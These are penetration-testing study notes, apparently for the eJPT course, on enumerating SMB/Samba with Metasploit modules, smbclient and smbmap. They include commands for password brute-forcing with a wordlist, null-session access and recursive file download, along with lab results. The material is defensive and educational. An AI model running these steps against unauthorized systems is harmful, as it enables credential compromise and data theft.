---
title: SMB Enumeration
tags: [eJPT, Enumeration, SMB, Samba, Metasploit, BruteForce]
created: 2026-04-06
source: Notion
---

# SMB Enumeration

**Related:** [[Introduction-to-Enumeration]] | [[Port-Scanning-Auxiliary-Modules]] | [[FTP-Enumeration]] | [[SSH-Enumeration]] | [[00-INDEX]]

---

## Overview

SMB (Server Message Block) runs on **port 445 TCP** (port 139 on older Windows systems). On Linux, SMB is implemented via **Samba**. Metasploit provides auxiliary modules to enumerate SMB services.

---

## What is SMB?

- **Port:** 445 TCP (legacy: 139 TCP)
- **Protocol:** Server Message Block — used for file/printer sharing on Windows networks
- **Linux equivalent:** Samba (open-source SMB implementation)
- Authenticates via username and password
- Can expose shared directories, user accounts, and OS version information

---

## Pro Tip: Global Variables with `setg`

When scanning the same target across multiple modules, use `setg` to set a global variable — avoids re-typing `set RHOSTS` every time:

```bash
setg RHOSTS <target-ip>
```

This persists for all subsequent modules in the session.

---

## Metasploit SMB Auxiliary Modules

### 1. SMB Version Scanner

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS <target-ip>
run
```

- Identifies the exact SMB/Samba version
- Lab result: **Samba 4.3.11 on Ubuntu**
- Use version info to search for CVEs: `search Samba`

### 2. SMB User Enumeration

```bash
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS <target-ip>
run
```

- Enumerates user accounts on the SMB server
- Lab result: **John / Ellie / Aisha / Sean / Emma / admin**
- These usernames can be used in brute force attacks

### 3. SMB Share Enumeration

```bash
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <target-ip>
set ShowFiles true
run
```

- Lists all shares on the target
- `ShowFiles true` displays files within each share
- Lab result: **public / John / Aisha / IPC$**

### 4. SMB Brute Force (Login Scanner)

```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS <target-ip>
set SMBUser admin
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

- Brute forces credentials for a known username
- Lab result: **admin : password**

---

## Interacting with SMB

### List All Shares

```bash
smbclient -L <target-ip> -U admin
# Enter password when prompted
```

### Connect to a Share

```bash
smbclient //<target-ip>/public -U admin
smbclient //<target-ip>/admin -U admin          # Named share
smbclient //<target-ip>/C$ -U admin             # Admin share (Windows)
```

### smbclient Commands

| Command | Description |
|---------|-------------|
| `ls` | List files/directories |
| `cd <dir>` | Change directory |
| `pwd` | Print current directory |
| `get <file>` | Download a file |
| `mget <pattern>` | Download multiple files |
| `put <file>` | Upload a file |
| `mkdir <dir>` | Create a directory |
| `del <file>` | Delete a file |
| `exit` | Close the session |

### Download Recursively with smbclient

```bash
smbclient //<target-ip>/public -U admin -c 'recurse;prompt;mget *'
```

### smbmap — Enumerate Shares and Permissions

```bash
# List all shares with read/write permissions
smbmap -H <target-ip> -u admin -p password

# List files in a specific share
smbmap -H <target-ip> -u admin -p password -r public

# Download a file directly
smbmap -H <target-ip> -u admin -p password --download public/flag.txt
```

### Null Session (No Credentials)

```bash
smbclient -L <target-ip> -N          # -N = no password
smbclient //<target-ip>/public -N
```

---

## Full Lab Workflow

```bash
service postgresql start
msfconsole
workspace add SMB_ENUM

# Set global target
setg RHOSTS <target-ip>

# 1. Version scan
use auxiliary/scanner/smb/smb_version
run
# Result: Samba 4.3.11 Ubuntu

# 2. User enumeration
use auxiliary/scanner/smb/smb_enumusers
run
# Result: John/Ellie/Aisha/Sean/Emma/admin

# 3. Share enumeration
use auxiliary/scanner/smb/smb_enumshares
set ShowFiles true
run
# Result: public/John/Aisha/IPC$

# 4. Brute force
use auxiliary/scanner/smb/smb_login
set SMBUser admin
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
# Result: admin:password

# 5. Connect via smbclient
exit
smbclient -L <target-ip> -U admin
smbclient //<target-ip>/public -U admin
ls
get flag
exit
```

---

## Searching for Modules

```bash
search type:auxiliary name:smb
search Samba    # Find exploits for the identified version
```

---

## Key Takeaways

- **`setg RHOSTS`** saves time when running multiple modules against the same target
- **smb_enumusers** gives you a username list — feed it directly into smb_login
- **smb_enumshares** with `ShowFiles true` reveals directory contents without connecting manually
- SMB credentials provide direct file access — always check shares for sensitive data
- Next topic: **SSH Enumeration** → [[SSH-Enumeration]]
